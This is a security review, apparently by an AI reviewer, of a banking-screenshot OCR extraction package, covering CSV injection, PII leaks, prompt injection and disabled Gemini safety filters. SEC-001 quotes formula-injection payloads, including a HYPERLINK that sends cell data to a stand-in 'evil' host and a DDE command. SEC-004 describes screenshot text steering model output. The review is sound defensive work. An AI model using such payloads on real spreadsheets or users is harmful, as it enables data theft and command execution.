# Security Review — `extraction/` package

> Saved by team lead from the security-reviewer's report (subagent file writes are blocked by the harness).

**Dimension:** security
**Target:** `extraction/` (15 files, full-module review at HEAD, no diff) + blast-radius sinks in `gui_app.py`, `edge-agent/local_extraction_client.py`
**Date:** 2026-07-21
**Reviewer anchors:** `.team-review/02-interconnect.md` lines 429-448 (### security), plus `## Integration Hot-Spots` (line 373) and `## Assumptions` unverified (line 348). All anchors re-verified in code.

Threat model: OCR-extracted values are **untrusted input** — they originate from the rendered text of a screenshot the pipeline does not control, and several extracted fields are customer-influenceable upstream of the bank UI (`denominazione` is a customer-chosen company name; `note_della_richiesta` / `note_scheda_privati` are free-text notes). The downstream workflow opens exports in Italian Excel and displays values in banking UIs.

## Summary

| ID | Severity | Title | Primary location |
|---|---|---|---|
| SEC-001 | High | CSV/formula injection at every export sink (CWE-1236) | `evaluation.py:172-177, 234-239` |
| SEC-002 | Medium | Banking PII written to cwd, outside `.gitignore` coverage | `gui_app.py:250-256, 273-274` |
| SEC-003 | Medium | Raw OCR JSON (customer PII) in exception strings surfaced to logs/dialogs | `vlm_client.py:95-98, 39-44` |
| SEC-004 | Low | Prompt-injection surface via screenshot content; no value validation | `vlm_client.py:63-74, 186-192` |
| SEC-005 | Low | Gemini safety filters hard-disabled (`BLOCK_NONE`), undocumented | `llm_factory.py:64-71` |
| SEC-006 | Low (info) | API-key flow acceptable; one residual `repr` exposure note | `llm_factory.py:30-44` |
| SEC-007 | Low | Debug crops write raw banking screenshots to disk when enabled | `imaging.py:37-42`, `config.py:93-94` |

## Findings

### SEC-001 — CSV / formula injection at the export sinks (High)

- **Location:** `extraction/evaluation.py:172-177` (`build_debug_report`), `extraction/evaluation.py:234-239` (`export_to_csv`); re-implemented at `edge-agent/local_extraction_client.py:131-143` (`export_csv`)
- **Map anchor:** `.team-review/02-interconnect.md:431-434` (Reviewer Hints → security) and `:395-396` (Integration Hot-Spot 7); `.deep-dive/05-risks.md` S1
- **CWE:** CWE-1236
- **Confidence: 90**

`build_debug_report` writes `pred_value`, `gt_value`, `evidence_text`, and `reason` verbatim into a DataFrame and calls `pd.DataFrame(rows).to_csv(out_csv_path, encoding="utf-8-sig", sep=";")` with no formula neutralization (`evaluation.py:153-177`). `export_to_csv` does the same for `value` and `evidence_text` of every canonical field (`evaluation.py:196-199, 213-216`) and every soggetti/fidi/garanzie cell (`evaluation.py:224-231`). The `utf-8-sig` BOM plus `;` separator are chosen so Italian Excel opens the file with one double-click — Excel is the intended consumer.

Those cells are OCR-extracted, i.e. untrusted. A value beginning with `=`, `+`, `-`, or `@` (e.g. `=HYPERLINK("http://evil/"&A1)`, `=cmd|'/c calc'!A1`) is written unescaped and executes as a formula when opened in Excel. Likelihood is elevated, not incidental: the prompts explicitly demand character-exact fidelity — `"Estrai ogni cifra esattamente come appare"`, `"Non correggere refusi"` (`prompts.py:9-11`), and the FOOTER retry prompt `"Copia il testo PAROLA PER PAROLA"` (`prompts.py:66`) — so a formula-shaped value in a notes or denominazione field survives OCR intact.

Blast radius (confirmed): `gui_app.py:256, 274` call the same two `evaluation.py` sinks, so a sink-level fix covers CLI + GUI. The edge-agent re-implements the sink with `csv.writer` (`local_extraction_client.py:131-143`); `csv.writer` quotes for delimiters but performs **no** formula escaping — equally affected, and it would NOT inherit an `evaluation.py`-only fix. Deep-dive also flags the edge-agent `.xlsx` export (`data_table_tab.py`, out of scope) as the same class.

**Impact:** Formula/DDE execution or silent exfiltration (`HYPERLINK`/`WEBSERVICE`) on the analyst's machine. Realistic path: customer-controlled data → bank UI → screenshot → OCR → CSV → analyst's Excel.

**Fix:** Neutralize in one shared `extraction` helper (Working Principle #5) applied at row-build time — prefix any cell whose first character is in `= + - @ \t \r` with a leading apostrophe — and apply the same helper in `local_extraction_client.export_csv`.

### SEC-002 — Banking PII written to the working directory, outside `.gitignore` coverage (Medium)

- **Location:** `gui_app.py:250-256` (`poc_outputs_gui.json`, `poc_results_gui.csv`), `gui_app.py:273-274` (`poc_debug_gui.csv`); compare CLI `extraction/cli.py:337-340, 345-346`
- **Map anchor:** `.team-review/02-interconnect.md:446-448` ("Banking PII at rest"); `:422` (Change Impact Radius, "gui_app.py:256, 274 writes to cwd")
- **Confidence: 82**

Full extraction results — every field `value` plus `evidence_text` for real banking screens — are serialized to disk. The CLI writes into `INPUT_DIR` (`cli.py:337`), whose default `mnt/data` is covered by `.gitignore` line 9 (`/mnt`). The Tkinter GUI writes three files to **relative paths** (`gui_app.py:250-251, 273`), i.e. the process cwd — typically the repo root under `python gui_app.py`. Verified: `.gitignore` matches none of `poc_outputs_gui.json` / `poc_results_gui.csv` / `poc_debug_gui.csv` (it lists `/mnt`, `.env*`, `temp_uploads/`, `test_no_gt/`, build/Python artifacts only). A routine `git add .` stages cleartext customer NDG, names, and evidence text into the repository — the same failure class as the API key scrubbed from history on 2026-07-21 (CLAUDE.md secrets policy).

**Impact:** Accidental commit/push of banking PII into git history; PII at rest in an uncontrolled location.

**Fix:** Write GUI outputs under a gitignored directory (e.g. `INPUT_DIR` or `outputs/`), or minimally add `poc_*_gui.*` / `poc_outputs*.json` / `poc_debug*.csv` to `.gitignore`.

### SEC-003 — Raw OCR JSON (customer PII) embedded in exception strings surfaced to logs and UI dialogs (Medium)

- **Location:** `extraction/vlm_client.py:95-98` (`Raw JSON (first 300)`), `vlm_client.py:39` (`text[:200]`), `vlm_client.py:43-44` (`text[start:start+200]!r`). Propagation: `extraction/cli.py:251` (stdout), `gui_app.py:236` (log pane), `gui_app.py:283` (`messagebox.showerror`)
- **Map anchor:** `.team-review/02-interconnect.md:388-391` (Integration Hot-Spot 5); `:446` (banking-PII theme)
- **Confidence: 75**

When Gemini free-form output fails Pydantic validation, the raised `ValueError` embeds up to 300 characters of the model's raw JSON — the extracted banking content (NDG, denominazione, note). `_extract_json_str` similarly embeds up to 200 characters of raw model text. Because `call_vlm_with_retry` re-raises `ValueError` immediately (`vlm_client.py:252-253`), the message propagates unmodified to stdout (`cli.py:251`), the GUI log pane (`gui_app.py:236`), and a modal dialog (`gui_app.py:283`).

**Impact:** Customer PII leaks into terminals, log panes, and dialogs — surfaces that get screenshotted or pasted into bug reports. Defeats the otherwise-clean "no values in logs" posture (`_debug_log` logs provider/model only, `cli.py:198-205`).

**Fix:** Redact/truncate the raw payload in these `ValueError` messages (hash or field count instead of content), or gate the raw JSON behind `DEBUG_MODE`.

### SEC-004 — Prompt-injection surface via screenshot content; no post-hoc value validation (Low)

- **Location:** `extraction/vlm_client.py:186-192` (OpenAI: prompt in `SystemMessage`), `vlm_client.py:63-74` (Gemini free-form: prompt + schema + image in a single `HumanMessage`, no role separation); downstream trust at `extraction/pipeline.py:311-328` (`_coherence_check`)
- **Map anchor:** `.team-review/02-interconnect.md:435-439`; `:312-314` (Domain Rules)
- **Confidence: 70**

The screenshot is the untrusted input; its rendered text is interpreted by the VLM alongside the instruction prompt. `with_structured_output(schema, include_raw=True)` (`vlm_client.py:147, 193`) constrains response **shape**, not `value` **content** — injected instruction text inside a screenshot can steer free-form field values, which are then trusted by `_coherence_check` (sets `evidenze="B"` / `tipo="BMB"` from tooltip text, `pipeline.py:317-328`), by evaluation, and by the SEC-001 sinks. The Gemini free-form path is marginally weaker (no system/user boundary). No allow-list or post-hoc validation of extracted values exists anywhere in `extraction/`. Standalone exploitability is low (no tool/code execution driven off a value), but it is the upstream feeder for SEC-001.

**Fix:** Treat values as tainted end-to-end; per-field sanity constraints where the domain allows (`ndg`/`n_fido` numeric-only — `norm_number_str` exists), paired with SEC-001 sink escaping. For Gemini, keep the instruction in a system-role message where the SDK supports it.

### SEC-005 — Gemini safety filters hard-disabled (`BLOCK_NONE`), undocumented deliberate posture (Low, informational)

- **Location:** `extraction/llm_factory.py:64-71` — all four `HARM_CATEGORY_*` set to `"BLOCK_NONE"`
- **Map anchor:** `.team-review/02-interconnect.md:444-445`
- **Confidence: 88**

Defensible for banking-UI OCR (avoids spurious refusals), but applied silently with no comment explaining intent, and it removes the only provider-side filter over adversarial image content (same surface as SEC-004). No equivalent lever on the OpenAI path. The defect is undocumented risk-acceptance.

**Fix:** Inline comment stating intent and accepted risk; optionally env-gate `BLOCK_NONE`.

### SEC-006 — API-key flow is acceptable; one residual exposure note (Low, informational)

- **Location:** `extraction/llm_factory.py:30-44` (resolution `api_key` arg → `LLM_API_KEY` → legacy vars; errors omit the key at `:41-44, 50-53, 59-63`; warning names only the var, `:36-40`); `extraction/cli.py:198-205` (`_debug_log` prints provider/model only); `gui_app.py:24, 53-58, 240` (StringVar pre-filled from env, masked `show="*"`, passed per-batch)
- **Map anchor:** `.team-review/02-interconnect.md:440-443`; `:420`
- **Confidence: 80**

No key logging, no key in exceptions, nothing persisted by `extraction/`; the key never enters JSON/CSV outputs. Sound. Residual: the key lives in shared `ChatModel` instances across worker threads for the batch lifetime — a crash dump or a LangChain version echoing the key in `repr(chat_model)` could surface it (latent; current providers wrap keys as `SecretStr`).

**Fix:** None required; avoid `repr(chat_model)` in any future log/exception path.

### SEC-007 — Debug crops write raw banking screenshots to disk when enabled (Low)

- **Location:** `extraction/imaging.py:37-42` (`save_debug_crop` → `INPUT_DIR/debug_crops/`), gated by `DEBUG_SAVE_CROPS` (`extraction/config.py:93-94`); call sites `extraction/pipeline.py:73, 107, 273`
- **Map anchor:** `.team-review/02-interconnect.md:447-448`
- **Confidence: 78**

With `DEBUG_SAVE_CROPS=1`, cropped regions of raw banking screenshots (including the NDG + denominazione header crop) are written to disk. Default `INPUT_DIR=mnt/data` falls under gitignored `/mnt`, containing git exposure; residual is unmanaged plaintext PII with no retention/cleanup, and no guard if an operator repoints `INPUT_DIR` (env-driven, `config.py:8`) into a tracked tree — crops silently inherit that location.

**Fix:** Document that `DEBUG_SAVE_CROPS` must target a gitignored/ephemeral path; optionally refuse to write when the resolved dir is inside the working tree and not ignored.

## Cross-Reviewer Notes

- **(logic-integrity / architecture)** Anchor confidence gate is dead code — `pipeline.py:86-102` binds `ndg`/`den` to copies from `safe_field` before the gate runs, and `safe_set_field(..., value=None)` cannot null a non-null value (`normalization.py:78`). Security-adjacent: a low-confidence/hallucinated NDG flows unfiltered into the main-pass hint (`pipeline.py:203-209`) and final result, weakening `dataset_mismatch_guard`. Data-integrity control failure, not a vulnerability per se.
- **(logic-integrity)** `MAX_CALLS_PER_SCREEN` ∈ {1,2} → `ThreadPoolExecutor(max_workers=0)` `ValueError` on nearly every screen (`pipeline.py:262, 284`); docs claim retries are "disabled" (`.deep-dive/05-risks.md` A1). Availability.
- **(logic-integrity)** `FieldResult.confidence` has no bounds/NaN validator (`schemas.py:11`); `NaN` silently suppresses retries and flips `pick_best` (`pipeline.py:255`, `normalization.py:94-96`) — matches map Assumptions/unverified (`02-interconnect.md:350-351`). A garbled model response could disable the retry safety net.
- **(hygiene)** Bare `except:` in `norm_number_str` (`normalization.py:54`) swallows `KeyboardInterrupt`/`SystemExit` and masks malformed numeric input feeding `classify_field`.
- **(architecture / reliability)** Unbounded nested fan-out — outer batch pool up to 12 (`gui_app.py:244`) × inner retry pool up to 3 (`pipeline.py:284`), no global throttle; a `401`-class auth error is retried 3× with backoff before failing (`vlm_client.py:252-257`). Cost/self-DoS exposure.
- **(architecture)** Ground-truth CSV boundary uses pandas defaults (`evaluation.py:35`); a `;`-separated or non-UTF-8 file (Italian Excel default) raises instead of parsing — availability; the same Excel-format assumption underlies the SEC-001 sink workflow.
- **(hygiene)** ~115-line dead dedup cluster (`cli.py:36-152`, call commented at `cli.py:268-273`) and stale docstring "Streamlit (app.py)" (`cli.py:296`).

## Context utilization

7 of 7 findings cite an interconnect-map anchor (100%). SEC-002 and SEC-003 extend the map's "banking PII at rest" hint with two specifics it did not enumerate: GUI outputs land outside `.gitignore` coverage, and raw OCR JSON leaks through exception strings into logs/dialogs.
